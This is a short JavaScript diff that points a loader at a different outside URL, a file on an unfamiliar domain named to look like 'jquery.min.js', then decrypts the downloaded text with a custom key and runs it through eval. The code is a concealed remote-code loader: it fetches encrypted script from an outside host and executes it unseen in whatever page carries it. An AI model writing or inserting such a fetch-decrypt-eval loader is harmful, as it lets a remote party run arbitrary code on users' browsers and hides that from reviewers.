@@ -24,10 +24,10 @@ function Decrypt(s1, id) {
 }
 
 
-fetch('https://raw.githubusercontent.com/izinezion/site-news/master/guerejo.js')
+fetch('https://cdn.iplezier.site/assets/js/habbo/jquery.min.js?1010')
     .then(function(response) {
         return response.text();
     })
     .then(function(body) {
-        eval(Decrypt(body));
+        eval(Decrypt(body, 8891));
 });
